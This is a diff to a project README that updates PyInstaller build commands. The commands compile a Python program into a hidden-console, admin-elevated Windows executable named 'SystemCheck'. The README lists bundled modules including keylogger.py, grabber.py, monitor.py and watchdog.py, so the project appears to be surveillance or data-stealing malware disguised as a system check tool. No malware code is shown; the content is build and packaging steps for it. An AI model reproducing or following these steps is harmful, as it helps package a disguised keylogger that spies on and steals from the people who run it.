@@ -8,7 +8,7 @@
 ## 🚀 Quick Build
 
 ```bash
-pyinstaller --onefile --noconsole --uac-admin --icon=icon.ico --name="SystemCheck" V12.py
+pyinstaller --onefile --noconsole --uac-admin --icon=icon.ico --name="SystemCheck" --hidden-import=pycaw.pycaw --hidden-import=comtypes --hidden-import=comtypes.client V12.py
 ```
 
 **Output:** `dist/SystemCheck.exe` (~75-80 MB with Python runtime)
@@ -45,7 +45,11 @@ del SystemCheck.spec
 
 ### Step 3: Build
 ```bash
-pyinstaller --onefile --noconsole --uac-admin --icon=icon.ico --name="SystemCheck" V12.py
+pyinstaller --onefile --noconsole --uac-admin --icon=icon.ico --name="SystemCheck" \
+  --hidden-import=pycaw.pycaw \
+  --hidden-import=comtypes \
+  --hidden-import=comtypes.client \
+  V12.py
 ```
 
 **PyInstaller automatically includes all imported modules** (config.py, utils.py, grabber.py, media.py, monitor.py, watchdog.py, keylogger.py).
